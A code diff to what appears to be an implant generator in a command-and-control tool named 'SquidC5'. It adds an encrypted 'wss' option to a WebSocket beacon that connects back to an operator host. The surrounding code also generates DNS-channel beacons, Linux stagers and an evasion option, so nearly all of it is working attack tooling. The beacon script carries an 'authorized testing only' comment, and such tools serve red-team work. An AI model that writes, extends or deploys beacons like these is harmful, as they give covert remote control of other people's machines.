@@ -154,7 +154,10 @@ while True:
 '''
 
 
-def generate_ws_beacon_python(host: str, port: int, path: str = "/ws/v1/beacon") -> str:
+def generate_ws_beacon_python(
+    host: str, port: int, path: str = "/ws/v1/beacon", *, scheme: str = "ws"
+) -> str:
+    sch = "wss" if scheme.lower() in ("wss", "https") else "ws"
     return f'''#!/usr/bin/env python3
 # SquidC5 ws_beacon_python — authorized testing only
 # Uses websocket-client if available, else stdlib http.client upgrade is not used;
@@ -164,6 +167,7 @@ import json, socket, time, random
 HOST = {json.dumps(host)}
 PORT = {int(port)}
 PATH = {json.dumps(path)}
+SCHEME = {json.dumps(sch)}
 SID = None
 
 def run_ws():
@@ -173,7 +177,7 @@ def run_ws():
     except ImportError:
         # minimal fallback: HTTP long-poll not available — raise clear error
         raise SystemExit("Install websocket-client: pip install websocket-client")
-    url = f"ws://{{HOST}}:{{PORT}}{{PATH}}"
+    url = f"{{SCHEME}}://{{HOST}}:{{PORT}}{{PATH}}"
     ws = websocket.create_connection(url, timeout=30)
     while True:
         try:
@@ -337,6 +341,7 @@ def generate_implant(
     evasion: bool = True,
     zone: str | None = None,
     ws_path: str | None = None,
+    scheme: str | None = None,
 ) -> dict[str, Any]:
     content: str
     meta: dict[str, Any] = {"family": family, "platform": platform, "arch": arch}
@@ -359,9 +364,11 @@ def generate_implant(
         meta["channel"] = "dns"
     elif family == "ws_beacon":
         wp = ws_path or "/ws/v1/beacon"
-        content = generate_ws_beacon_python(host, port, wp)
+        sch = "wss" if str(scheme or "").lower() in ("wss", "https") else "ws"
+        content = generate_ws_beacon_python(host, port, wp, scheme=sch)
         meta["ws_path"] = wp
         meta["channel"] = "ws"
+        meta["scheme"] = sch
     elif family == "linux_stager":
         if platform != "linux":
             raise ValueError("linux_stager is linux-only")
